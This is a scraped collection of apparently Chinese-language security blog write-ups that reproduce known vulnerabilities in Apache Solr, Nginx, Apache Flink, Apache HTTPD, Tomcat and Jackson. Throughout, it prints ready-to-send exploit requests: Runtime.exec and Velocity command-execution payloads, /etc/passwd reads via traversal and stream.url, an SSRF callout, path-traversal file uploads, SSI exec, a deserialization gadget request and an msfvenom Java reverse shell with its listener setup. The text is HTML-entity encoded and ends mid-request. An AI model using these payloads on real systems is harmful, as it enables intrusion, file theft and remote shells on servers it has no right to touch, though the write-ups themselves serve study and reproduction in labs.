&lt;&#x2F;document&gt;&lt;&#x2F;dataConfig&gt; 点击Execute with this Confuguration会发送以下请求包： 1234567891011121314POST &#x2F;solr&#x2F;test&#x2F;dataimport?_&#x3D;1565835261600&amp;indent&#x3D;on&amp;wt&#x3D;json HTTP&#x2F;1.1Host: localhost:8983User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10.14; rv:68.0) Gecko&#x2F;20100101 Firefox&#x2F;68.0Accept: application&#x2F;json, text&#x2F;plain, *&#x2F;*Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2Accept-Encoding: gzip, deflateContent-type: application&#x2F;x-www-form-urlencodedX-Requested-With: XMLHttpRequestContent-Length: 679Connection: closeReferer: http:&#x2F;&#x2F;localhost:8983&#x2F;solr&#x2F;Cookie: csrftoken&#x3D;gzcSR6Sj3SWd3v4ZxmV5OcZuPKbOhI6CMpgp5vIMvr5wQAL4stMtxJqL2sUE8INi; sessionid&#x3D;snzojzqa5zn187oghf06z6xodulpohprcommand&#x3D;full-import&amp;verbose&#x3D;false&amp;clean&#x3D;false&amp;commit&#x3D;true&amp;debug&#x3D;true&amp;core&#x3D;test&amp;dataConfig&#x3D;%3CdataConfig%3E%0A++%3CdataSource+type%3D%22URLDataSource%22%2F%3E%0A++%3Cscript%3E%3C!%5BCDATA%5B%0A++++++++++function+poc()%7B+java.lang.Runtime.getRuntime().exec(%22touch+%2Ftmp%2Fsuccess%22)%3B%0A++++++++++%7D%0A++%5D%5D%3E%3C%2Fscript%3E%0A++%3Cdocument%3E%0A++++%3Centity+name%3D%22stackoverflow%22%0A++++++++++++url%3D%22https%3A%2F%2Fstackoverflow.com%2Ffeeds%2Ftag%2Fsolr%22%0A++++++++++++processor%3D%22XPathEntityProcessor%22%0A++++++++++++forEach%3D%22%2Ffeed%22%0A++++++++++++transformer%3D%22script%3Apoc%22+%2F%3E%0A++%3C%2Fdocument%3E%0A%3C%2FdataConfig%3E&amp;name&#x3D;dataimport Apache Solr Velocity 注入远程命令执行漏洞 (CVE-2019-17558)Apache Solr 5.0.0版本至8.3.1版本中存在输入验证错误漏洞。攻击者可借助Velocity模板利用该漏洞在系统上执行任意代码。 默认情况下params.resource.loader.enabled配置未打开，无法使用自定义模板。我们先通过如下API获取所有的核心： 1http:&#x2F;&#x2F;127.0.0.1:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json 启用params.resource.loader。启用配置通过以下API,该API端点/solr/[core name]/config: 123456789101112131415POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1Host: solr:8983Content-Type: application&#x2F;jsonContent-Length: 259&#123; &quot;update-queryresponsewriter&quot;: &#123; &quot;startup&quot;: &quot;lazy&quot;, &quot;name&quot;: &quot;velocity&quot;, &quot;class&quot;: &quot;solr.VelocityResponseWriter&quot;, &quot;template.base.dir&quot;: &quot;&quot;, &quot;solr.resource.loader.enabled&quot;: &quot;true&quot;, &quot;params.resource.loader.enabled&quot;: &quot;true&quot; &#125;&#125; 之后，注入Velocity模板即可执行任意命令： 1http:&#x2F;&#x2F;192.168.1.101:8983&#x2F;solr&#x2F;demo&#x2F;select?q&#x3D;1&amp;&amp;wt&#x3D;velocity&amp;v.template&#x3D;custom&amp;v.template.custom&#x3D;%23set($x&#x3D;%27%27)+%23set($rt&#x3D;$x.class.forName(%27java.lang.Runtime%27))+%23set($chr&#x3D;$x.class.forName(%27java.lang.Character%27))+%23set($str&#x3D;$x.class.forName(%27java.lang.String%27))+%23set($ex&#x3D;$rt.getRuntime().exec(%27id%27))+$ex.waitFor()+%23set($out&#x3D;$ex.getInputStream())+%23foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))%23end Apache solr任意文件读取访问得到内核 1http:&#x2F;&#x2F;your-ip:8983&#x2F;solr&#x2F;admin&#x2F;cores?indexInfo&#x3D;false&amp;wt&#x3D;json 发送如下请求，开启内核的 RemoteStreaming 123456POST &#x2F;solr&#x2F;demo&#x2F;config HTTP&#x2F;1.1Host: 192.168.1.101:8983Content-Type: application&#x2F;jsonContent-Length: 83&#123; &quot;set-property&quot; :&#123;&quot;requestDispatcher.requestParsers.enableRemoteStreaming&quot;:true&#125;&#125; 通过 stream.url 任意文件读取 123456POST &#x2F;solr&#x2F;demo&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1Host: 192.168.1.101:8983Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 29stream.url&#x3D;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd SSRF 123456POST &#x2F;solr&#x2F;demo&#x2F;debug&#x2F;dump?param&#x3D;ContentStreams HTTP&#x2F;1.1Host: 192.168.1.101:8983Content-Type: application&#x2F;x-www-form-urlencodedContent-Length: 34stream.url&#x3D;http:&#x2F;&#x2F;tegean.dnslog.cn 参考文章：https://vulhub.org/","categories":[],"tags":[]},{"title":"Nginx相关漏洞","slug":"nginx相关漏洞","date":"2021-04-15T08:49:51.000Z","updated":"2021-04-15T12:53:53.587Z","comments":true,"path":"article/3954b176.html","link":"","permalink":"https://blog.cfyqy.com/article/3954b176.html","excerpt":"Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。","text":"Nginx (engine x) 是一个高性能的HTTP和反向代理web服务器，同时也提供了IMAP/POP3/SMTP服务。 Nginx 文件名逻辑漏洞（CVE-2013-4547）影响版本：Nginx 0.8.41 ~ 1.4.3 / 1.5.0 ~ 1.5.7 这个漏洞其实和代码执行没有太大关系，其主要原因是错误地解析了请求的URI，错误地获取到用户请求的文件名，导致出现权限绕过、代码执行的连带影响。 举个例子，比如，Nginx匹配到.php结尾的请求，就发送给fastcgi进行解析，常见的写法如下： 12345678location ~ \\.php$ &#123; include fastcgi_params; fastcgi_pass 127.0.0.1:9000; fastcgi_index index.php; fastcgi_param SCRIPT_FILENAME &#x2F;var&#x2F;www&#x2F;html$fastcgi_script_name; fastcgi_param DOCUMENT_ROOT &#x2F;var&#x2F;www&#x2F;html;&#125; 正常情况下（关闭pathinfo的情况下），只有.php后缀的文件才会被发送给fastcgi解析。 而存在CVE-2013-4547的情况下，我们请求1.gif[0x20][0x00].php，这个URI可以匹配上正则.php$，可以进入这个Location块；但进入后，Nginx却错误地认为请求的文件是1.gif[0x20]，就设置其为SCRIPT_FILENAME的值发送给fastcgi。 fastcgi根据SCRIPT_FILENAME的值进行解析，最后造成了解析漏洞。 所以，我们只需要上传一个空格结尾的文件，即可使PHP解析之。 再举个例子，比如很多网站限制了允许访问后台的IP： 1234location &#x2F;admin&#x2F; &#123; allow 127.0.0.1; deny all;&#125; 我们可以请求如下URI：/test[0x20]/../admin/index.php，这个URI不会匹配上location后面的/admin/，也就绕过了其中的IP验证；但最后请求的是/test[0x20]/../admin/index.php文件，也就是/admin/index.php，成功访问到后台。（这个前提是需要有一个目录叫test：这是Linux系统的特点，如果有一个不存在的目录，则即使跳转到上一层，也会爆文件不存在的错误，Windows下没有这个限制） 漏洞复现：这个环境是黑名单验证，我们无法上传php后缀的文件，需要利用CVE-2013-4547。我们上传一个1.gif，注意后面的空格访问http://your-ip:8080/uploadfiles/1.gif[0x20][0x00].php，即可发现PHP已被解析： 注意，[0x20]是空格，[0x00]是\\0，这两个字符都不需要编码。 漏洞分析：CVE-2013-4547 Nginx解析漏洞深入利用及分析 Nginx越界读取缓存漏洞（CVE-2017-7529）Nginx在反向代理站点的时候，通常会将一些文件进行缓存，特别是静态文件。缓存的部分存储在文件中，每个缓存文件包括“文件头”+“HTTP返回包头”+“HTTP返回包体”。如果二次请求命中了该缓存文件，则Nginx会直接将该文件中的“HTTP返回包体”返回给用户。 如果我的请求中包含Range头，Nginx将会根据我指定的start和end位置，返回指定长度的内容。而如果我构造了两个负的位置，如(-600, -9223372036854774591)，将可能读取到负位置的数据。如果这次请求又命中了缓存文件，则可能就可以读取到缓存文件中位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。 访问http://your-ip:8080/，即可查看到Nginx默认页面，这个页面实际上是反向代理的8081端口的内容。 调用python3 poc.py http://your-ip:8080/，读取返回结果：可见，越界读取到了位于“HTTP返回包体”前的“文件头”、“HTTP返回包头”等内容。漏洞分析：https://cert.360.cn/warning/detail?id=b879782fbad4a7f773b6c18490d67ac7 Nginx 配置错误导致漏洞错误配置一：CRLF注入漏洞Nginx会将$uri进行解码，导致传入%0a%0d即可引入换行符，造成CRLF注入漏洞。 错误的配置文件示例（原本的目的是为了让http的请求跳转到https上）： 123location &#x2F; &#123; return 302 https:&#x2F;&#x2F;$host$uri;&#125; Payload: http://your-ip:8080/%0a%0dSet-Cookie:%20a=1，可注入Set-Cookie头。 错误配置二：目录穿越漏洞Nginx在配置别名（Alias）的时候，如果忘记加/，将造成一个目录穿越漏洞。 错误的配置文件示例（原本的目的是为了让用户访问到/home/目录下的文件）： 123location &#x2F;files &#123; alias &#x2F;home&#x2F;;&#125; Payload: http://your-ip:8081/files../ ，成功穿越到根目录： 错误配置三：Nginx配置文件子块（server、location、if）中的add_header，将会覆盖父块中的add_header添加的HTTP头，造成一些安全隐患。 如下列代码，整站（父块中）添加了CSP头： 1234567891011add_header Content-Security-Policy &quot;default-src &#39;self&#39;&quot;;add_header X-Frame-Options DENY;location &#x3D; &#x2F;test1 &#123; rewrite ^(.*)$ &#x2F;xss.html break;&#125;location &#x3D; &#x2F;test2 &#123; add_header X-Content-Type-Options nosniff; rewrite ^(.*)$ &#x2F;xss.html break;&#125; 但/test2的location中又添加了X-Content-Type-Options头，导致父块中的add_header全部失效： Nginx 解析漏洞复现Nginx解析漏洞复现。 版本信息： Nginx 1.x 最新版PHP 7.x最新版由此可知，该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。 增加/.php后缀，被解析成PHP文件： 前面说了该漏洞与Nginx、php版本无关，属于用户配置不当造成的解析漏洞。那么我们看一下配置不当的地方。这是一段nginx配置，将.php结尾的文件都会交给fastcgi来执行，/uploadfiles/nginx.png/a.php也会交给fastcgi解析，fastcgi在解析”.php”文件时发现文件并不存在，这时php.ini配置文件中的cig.fix_pathinfo就发挥作用了，ccgi.fix_pathinfo是默认开启的，当php遇到文件路径/aaa.xxx/bbb.yyy/ccc.zzz时，若/aaa.xxx/bbb.yyy/ccc.zzz不存在，则会去掉最后的/ccc.zzz，然后判断/aaa.xxx/bbb.yyy是否存在，若存在，则把/aaa.xxx/bbb.yyy当做文件/aaa.xxx/bbb.yyy/ccc.zzz解析，若/aaa.xxx/bbb.yyy仍不存在，则继续去掉/bbb.yyy，以此类推。那么fastcgi到底能解析哪些文件呢，这个由php-fpm.conf中的security.limit_extensions参数决定的，下面是php手册中对security.limit_extensions的解释 123security.limit_extensions string 限制 FPM 允许解析的脚本扩展名。 此设置可以预防 web 服务器配置的错误。应当限制 FPM 仅仅解析 .php 扩展名，阻止恶意用户使用其他扩展名运行 php 代码。 默认值： .php .phar 应当注意的是当此项设置为空的时候表示允许fastcgi将’.png’等文件当做代码解析，恰好这个漏洞环境就是security.limit_extensions为空。成功将nginx.png当成了php执行 修复方案1、如果cig.fix_pathinfo可以关闭的话就关闭，关闭该选项很可能会导致一些其他错误，所以一般是开启的2、将security.limit_extensions选项只填写.php，阻止恶意用户使用其他扩展名运行 php 代码，下面是我们修改了配置重启之后的再恶意执行的情况，Access denied.。 参考文章：Nginx 解析漏洞https://vulhub.org/ https://www.cnblogs.com/HelloCTF/p/14098983.html","categories":[],"tags":[],"author":"ye1s"},{"title":"Apache Flink 相关漏洞","slug":"Apache-Flink-相关漏洞学习","date":"2021-04-15T05:30:00.000Z","updated":"2021-04-15T08:47:21.103Z","comments":true,"path":"article/81e2968a.html","link":"","permalink":"https://blog.cfyqy.com/article/81e2968a.html","excerpt":"Apache Flink是一个分布式大数据处理引擎，可以对有限数据流和无限数据流进行有状态计算。可部署在各种集群环境，对各种大小的数据规模进行快速计算。","text":"Apache Flink是一个分布式大数据处理引擎，可以对有限数据流和无限数据流进行有状态计算。可部署在各种集群环境，对各种大小的数据规模进行快速计算。 深入理解Apache Flink核心技术 Apache Flink Dashboard 未授权访问-远程代码命令执行getshell kail下生成 1msfvenom -p java/shell_reverse_tcp lhost=192.168.1.100 lport=1234 -f jar &gt;a.jar msf接收shell 123456msfconsoleuse exploit&#x2F;multi&#x2F;handlerset payload java&#x2F;shell_reverse_tcpset LHOST 192.168.1.100set LPORT 1234exploit 将jar包上传后点击上传的包然后Submit Apache Flink 文件上传漏洞(CVE-2020-17518)pache Flink框架是一个开源的流处理与强大的流和批处理功能。 Apache Flink 1.5.1介绍REST处理程序允许您编写一个上传文件在本地文件系统上的任意位置,通过一个HTTP头恶意修改。 Flink 具有监控 API，可用于查询”正在运行的jobs” 和 “最近完成的jobs” 的状态和统计信息。该监控 API 被用于 Flink 自己的dashboard，同时也可用于自定义监控工具，默认监听在8081端口。该监控 API 是 REST-ful API, 即接受 HTTP请求，并响应JSON格式的数据 监控 API 中有一个API是 /jars/upload，其作用是将一个jar上传到集群。该jar必须作为多部分数据发送。确保“ Content-Type”标头设置为“ application / x-java-archive”，因为某些http库默认情况下不添加标头。可以通过curl上传jar文件 影响版本：Apache Flink: 1.5.1 - 1.11.2 上传文件 123456789101112131415POST &#x2F;jars&#x2F;upload HTTP&#x2F;1.1Host: 192.168.1.102:8081Accept-Encoding: gzip, deflateAccept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;87.0.4280.88 Safari&#x2F;537.36Connection: closeContent-Type: multipart&#x2F;form-data; boundary&#x3D;----WebKitFormBoundaryoZ8meKnrrso89R6YContent-Length: 185------WebKitFormBoundaryoZ8meKnrrso89R6YContent-Disposition: form-data; name&#x3D;&quot;jarfile&quot;; filename&#x3D;&quot;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;tmp&#x2F;success&quot;success------WebKitFormBoundaryoZ8meKnrrso89R6Y-- 漏洞分析：CVE-2020-17519 &amp; CVE-2020-17518 分析 Apache Flink jobmanager/logs 目录穿越漏洞(CVE-2020-17519)Apache Flink框架是一个开源的流处理与强大的流和批处理功能。 改变了Apache Flink 1.11.0(1.11.1释放和1.11.2)允许攻击者读取本地文件系统上的任何文件JobManager JobManager通过REST接口的过程。 允许攻击者通过JobManager进程的REST接口读取JobManager本地文件系统上的任何文件。访问仅限于JobManager进程可访问的文件。 影响版本：Apache Flink: 1.11.0, 1.11.1, 1.11.2 比如我这里读取/etc/下的passwd文件,%252f为/的两次url编码 /jobmanager/logs/..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd","categories":[],"tags":[],"author":"ye1s"},{"title":"Apache漏洞","slug":"apache相关漏洞学习","date":"2021-04-15T01:24:47.000Z","updated":"2021-04-15T08:47:30.927Z","comments":true,"path":"article/b0e821f4.html","link":"","permalink":"https://blog.cfyqy.com/article/b0e821f4.html","excerpt":"apache小组起家的apache更名为httpd，也更符合其http server的特性。而apache现在成为 apache基金会下几十种开源项目的标识。apache和httpd是一个，到apache2后就叫httpd了。","text":"apache小组起家的apache更名为httpd，也更符合其http server的特性。而apache现在成为 apache基金会下几十种开源项目的标识。apache和httpd是一个，到apache2后就叫httpd了。 Apache HTTPD 换行解析漏洞（CVE-2017-15715）Apache HTTPD是一款HTTP服务器，它可以通过mod_php来运行PHP网页。其2.4.0~2.4.29版本中存在一个解析漏洞，在解析PHP时，1.php\\x0A将被按照PHP后缀进行解析，导致绕过一些服务器的安全策略。 漏洞复现上传一个名为index.php的文件，被拦截，在index.php后面插入一个\\x0A（注意，不能是\\x0D\\x0A，只能是一个\\x0A），不再拦截访问刚才上传的/index.php%0a，发现能够成功解析，但这个文件不是php后缀，说明目标存在解析漏洞： Apache HTTPD 多后缀解析漏洞Apache HTTPD 多后缀解析漏洞Apache HTTPD 支持一个文件拥有多个后缀，并为不同后缀执行不同的指令。比如，如下配置文件： 12AddType text&#x2F;html .htmlAddLanguage zh-CN .cn 其给.html后缀增加了media-type，值为text/html；给.cn后缀增加了语言，值为zh-CN。此时，如果用户请求文件index.cn.html，他将返回一个中文的html页面。 以上就是Apache多后缀的特性。如果运维人员给.php后缀增加了处理器： 1AddHandler application&#x2F;x-httpd-php .php 那么，在有多个后缀的情况下，只要一个文件含有.php后缀的文件即将被识别成PHP文件，没必要是最后一个后缀。利用这个特性，将会造成一个可以绕过上传白名单的解析漏洞。 漏洞复现： http://your-ip/index.php 中是一个白名单检查文件后缀的上传组件，上传完成后并未重命名。我们可以通过上传文件名为xxx.php.jpg或xxx.php.jpeg的文件，利用Apache解析漏洞进行getshell。 Apache SSI 远程命令执行漏洞在测试任意文件上传漏洞的时候，目标服务端可能不允许上传php后缀的文件。如果目标服务器开启了SSI与CGI支持，我们可以上传一个shtml文件，并利用&lt;!--#exec cmd=&quot;id&quot; --&gt;语法执行任意命令。 详细命令可看如下文章：https://httpd.apache.org/docs/2.4/howto/ssi.htmlhttps://www.w3.org/Jigsaw/Doc/User/SSI.html 正常上传PHP文件是不允许的，我们可以上传一个shell.shtml文件： 1&lt;!--#exec cmd&#x3D;&quot;ls&quot; --&gt;","categories":[],"tags":[]},{"title":"Tomcat 漏洞","slug":"tomcat-漏洞学习","date":"2021-04-13T16:18:18.000Z","updated":"2021-04-27T07:39:25.754Z","comments":true,"path":"article/3ae4417d.html","link":"","permalink":"https://blog.cfyqy.com/article/3ae4417d.html","excerpt":"Tomcat相关知识点学习","text":"Tomcat相关知识点学习 Tomcat PUT任意文件上传(CVE-2017-12615)当存在漏洞的Tomcat 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 的webshell文件，JSP文件中的恶意代码将能被服务器执行，导致服务器上的数据泄露或获取服务器权限。 影响范围：Apache Tomcat 5.x 到 9.x Tomcat设置写权限(只读的= false),导致的结果我们可以写文件到服务器。 1234567891011121314151617&lt;servlet&gt; &lt;servlet-name&gt;default&lt;/servlet-name&gt; &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt; &lt;init-param&gt; &lt;param-name&gt;debug&lt;/param-name&gt; &lt;param-value&gt;0&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;listings&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;init-param&gt; &lt;param-name&gt;readonly&lt;/param-name&gt; &lt;param-value&gt;false&lt;/param-value&gt; &lt;/init-param&gt; &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt; 虽然Tomcat检查文件后缀在某种程度上(不能直接编写jsp),我们仍然可以绕过限制通过文件系统的一些特性(例如使用/ Linux和window,使用%20、::$DATA window) 漏洞复现：启动vulhub环境，利用 PUT 请求创建文件：提示404，JspServlet负责处理所有JSP和JPSX类型的动态请求，不能够处理PUT方法类型的请求。 利用系统特性绕过 漏洞分析： Tomcat 远程代码执行漏洞分析 tomcat7后台war部署上传shellTomcat支持在后台部署 war 文件，可以直接将 webshell 部署到 web 目录下。其中，欲访问后台，需要对应用户有相应权限。 Tomcat7+权限分为： 12345678manager（后台管理）manager-gui 拥有html页面权限manager-status 拥有查看status的权限manager-script 拥有text接口的权限，和status权限manager-jmx 拥有jmx权限，和status权限host-manager（虚拟主机管理）admin-gui 拥有html页面权限admin-script 拥有text接口权限 在conf/tomcat-users.xml文件中配置用户的权限 123456789101112131415&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;tomcat-users xmlns=\"http://tomcat.apache.org/xml\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://tomcat.apache.org/xml tomcat-users.xsd\" version=\"1.0\"&gt; &lt;role rolename=\"manager-gui\"/&gt; &lt;role rolename=\"manager-script\"/&gt; &lt;role rolename=\"manager-jmx\"/&gt; &lt;role rolename=\"manager-status\"/&gt; &lt;role rolename=\"admin-gui\"/&gt; &lt;role rolename=\"admin-script\"/&gt; &lt;user username=\"tomcat\" password=\"tomcat\" roles=\"manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script\" /&gt;&lt;/tomcat-users&gt; tomcat8中默认没有任何用户，且manager页面只允许本地IP访问 漏洞复现： 用户名密码：tomcat:tomcat getshell Tomcat AJP 文件包含漏洞(CVE-2020-1938)Ghostcat（幽灵猫） 是由长亭科技安全研究员发现的存在于 Tomcat 中的安全漏洞，由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。 Tomcat根据默认配置(conf/server.xml）启动两个连接器。一个是HTTP Connector默认监听8080端口处理HTTP请求，一个AJP connector默认8009端口处理AJP请求。Tomcat处理两个协议请求区别并不大，AJP协议相当于HTTP协议的二进制优化版。 本次漏洞出现在通过设置AJP请求属性，可控制AJP连接器封装的request对象的属性，最终导致文件包含可以任意文件读取和代码执行。 受影响版本 1234Apache Tomcat 6Apache Tomcat 7 &lt; 7.0.100Apache Tomcat 8 &lt; 8.5.51Apache Tomcat 9 &lt; 9.0.31 利用工具：CNVD-2020-10487-Tomcat-Ajp-lfi 1python2 CNVD-2020-10487-Tomcat-Ajp-lfi.py 目的ip -p 8009 -f &#x2F;WEB-INF&#x2F;web.xml 工具二：https://github.com/0nise/CVE-2020-1938 漏洞分析： tomcat在接收ajp请求的时候调用org.apache.coyote.ajp.AjpProcessor来处理ajp消息，prepareRequest将ajp里面的内容取出来设置成request对象的Attribute属性因此可以通过此种特性从而可以控制request对象的下面三个Attribute属性 123javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path 详情可看： Tomcat-Ajp协议漏洞分析 CVE-2020-1938:Tomcat AJP协议文件包含漏洞分析 Apache Tomcat Websocket DoS（CVE-2020-13935 ）详情可看：CVE-2020-13935 Apache Tomcat Websocket DoS 漏洞分析","categories":[],"tags":[],"author":"ye1s"},{"title":"Jackson漏洞","slug":"Jackson漏洞分析","date":"2021-04-01T02:24:53.000Z","updated":"2021-04-15T08:48:31.869Z","comments":true,"path":"article/64cb820c.html","link":"","permalink":"https://blog.cfyqy.com/article/64cb820c.html","excerpt":"Jackson是一款当下流行的json解释器，主要负责处理Json的序列化和反序列化。","text":"Jackson是一款当下流行的json解释器，主要负责处理Json的序列化和反序列化。 基础概念jackson核心模块由三部分构成： jackson-core - 核心包，提供基于流模式API jackson-annotations - 注解包，提供标准注解功能 jackson-databind - 数据绑定包， 提供基于”对象绑定” 解析的相关 API （ ObjectMapper ） 和”树模型” 解析的相关 API 123456789101112131415import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;public class Test &#123; public static void main(String[] args) throws IOException &#123; User user=new User(\"test\",18); ObjectMapper objectMapper=new ObjectMapper(); String json=objectMapper.writeValueAsString(user); System.out.println(json); User user1=objectMapper.readValue(json,User.class); System.out.println(user1); &#125;&#125; Jackson有一种特殊的机制 — JacksonPolymorphicDeserialization，这里可以翻译为Jackson的多态类型绑定,即字段类型为接口、抽象类或 Object 类型时，攻击者可以通过在 json 字符串中指定变量的具体类型 (子类或接口实现类)，来实现实例化指定的类，借助某些特殊的 class，如 TemplatesImpl，可以实现任意代码执行。从文档中可以看到两种情况，一种是 Global default typing（全局的DefaultTyping），另一种是 @JsonTypeInfo 注解两种方式。 DefaultTyping在这个方式里面一种有4个值 JAVA_LANG_OBJECT ：当类里的属性声明为一个Object时，会对该属性进行序列化和反序列化，并且明确规定类名。（当然，这个Object本身也得是一个可被序列化/反序列化的类）。 OBJECT_AND_NON_CONCRETE ：除了上文 提到的特征，当类里有 Interface 、 AbstractClass 时，对其进行序列化和反序列化。（当然，这些类本身需要是合法的、可以被序列化/反序列化的对象）。 NON_CONCRETE_AND_ARRAYS ：除了上文提到的特征，还支持上文全部类型的Array类型。 NON_FINAL ：包括上文提到的所有特征，而且包含即将被序列化的类里的全部、非final的属性，也就是相当于整个类、除final外的的属性信息都需要被序列化和反序列化。 123456789101112131415161718192021222324252627282930313233import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;class JavaLangObject &#123; public static void main(String args[]) throws IOException &#123; People p = new People(); p.age = 10; p.name = \"Mike\"; p.object = new ObjectDemo(); ObjectMapper mapper = new ObjectMapper(); mapper.enableDefaultTyping(ObjectMapper.DefaultTyping.JAVA_LANG_OBJECT); String json = mapper.writeValueAsString(p); System.out.println(json); //&#123;\"age\":10,\"name\":\"Mike\",\"object\":[\"com.jacksondemo.ObjectDemo\",&#123;\"length\":100&#125;]&#125; People p2 = mapper.readValue(json, People.class); System.out.println(p2); //age=10, name=Mike, com.jacksondemo.ObjectDemo@245614d6 &#125;&#125;class People &#123; public int age; public String name; public Object object; @Override public String toString() &#123; return String.format(\"age=%d, name=%s, %s\", age, name, object == null ? \"null\" : object); &#125;&#125;class ObjectDemo &#123; public int length = 100;&#125; @JsonTypeInfo 也是jackson多态类型绑定的一种方式，它一共支持下面5种类型的取值。 12345@JsonTypeInfo(use = JsonTypeInfo.Id.NONE)@JsonTypeInfo(use = JsonTypeInfo.Id.CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.MINIMAL_CLASS)@JsonTypeInfo(use = JsonTypeInfo.Id.NAME)@JsonTypeInfo(use = JsonTypeInfo.Id.COSTOM) 例子 12345678910111213141516171819202122232425262728293031import com.fasterxml.jackson.annotation.JsonTypeInfo;import com.fasterxml.jackson.databind.ObjectMapper;import java.io.IOException;public class Jsontypeinfo &#123; public static void main(String[] args) throws IOException &#123; ObjectMapper mapper= new ObjectMapper(); User user = new User(); user.name= \"Mike\"; user.age=100; user.obj=new Height(); String json = mapper.writeValueAsString(user); System.out.println(json); &#125;&#125;class User&#123; public String name; public int age; @JsonTypeInfo(use = JsonTypeInfo.Id.NONE) public Object obj; public String toString()&#123; return \"name:\" + name + \" age:\" + age + \" obj:\" + obj; &#125;&#125;class Height&#123; public int h = 100;&#125; （1）、Id.NONE这种方式的输出结果实际上是我们最想要的，这里只需要相关参数的值，并没有其他一些无用信息。 1&#123;\"name\":\"Mike\",\"age\":100,\"obj\":&#123;\"h\":100&#125;&#125; （2）、Id.CLASS这种方式的输出结果中携带了相关java类，也就是说反序列化的时候如果使用了JsonTypeInfo.Id.CLASS修饰的话，可以通过 @class 方式指定相关类，并进行相关调用。 1&#123;\"name\":\"Mike\",\"age\":100,\"obj\":&#123;\"@class\":\"com.jacksondemo.Height\",\"h\":100&#125;&#125; （3）、Id.MINIMAL_CLASS这种方式的输出结果也携带了相关类，和 id.CLASS 的区别在 @class 变成了 @c ，从官方文档中描述中这个应该是一个更短的类名字。同样也就是说反序列化的时候如果使用了JsonTypeInfo.Id.MINIMAL_CLASS修饰的话，可以通过 @c 方式指定相关类，并进行相关调用。 1&#123;\"name\":\"Mike\",\"age\":100,\"obj\":&#123;\"@c\":\"com.jacksondemo.Height\",\"h\":100&#125;&#125; （4）、Id.NAME这种输出方式没有携带类名字，在反序列化时也是不可以利用的。 1&#123;\"name\":\"Mike\",\"age\":100,\"obj\":&#123;\"@type\":\"Height\",\"h\":100&#125;&#125; （5）、Id.COSTOM这个无法直接用，需要手写一个解析器才可以配合使用，所以直接回抛出异常。 Jackson反序列化(CVE-2017-7525)根据触发条件是ObjectMapper反序列化前调用了enableDefaultTyping方法。该方法允许json字符串中指定反序列化java对象的类名，而在使用Object、Map、List等对象时，可诱发反序列化漏洞 Jackson 2.7版本（&lt;2.7.10）、2.8版本（&lt;2.8.9） 调用了enableDefaultTyping方法 反序列化的类可控 漏洞复现：本漏洞利用条件如下： 开启 JacksonPolymorphicDeserialization，即调用以下任意方法 12objectMapper.enableDefaultTyping(); // default to using DefaultTyping.OBJECT_AND_NON_CONCRETEobjectMapper.enableDefaultTyping(ObjectMapper.DefaultTyping.NON_FINAL); Target class 需要有无参 constructor Target class 中需要需要有字段类型为 Interface、abstract class、Object，并且使用的 Gadget 需要为其子类 / 实现接口 Jackson-databind 在设置 Target class 成员变量参数值时，若没有对应的 getter 方法，则会使用 SetterlessProperty 调用 getter 方法，获取变量，然后设置变量值。当调用 getOutputProperties() 方法时，会初始化 transletBytecodes 包含字节码的类，导致命令执行，具体可参考 java-deserialization-jdk7u21-gadget-note 中关于 TemplatesImpl 的说明。 使用JDK7u21的com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl作为Gadget，发送如下请求，将会执行touch /tmp/prove1.txt： 12345678910111213141516171819202122POST /exploit HTTP/1.1Host: your-ip:8080Accept-Encoding: gzip, deflateAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: closeContent-Type: application/jsonContent-Length: 1298&#123; \"param\": [ \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", &#123; \"transletBytecodes\": [ 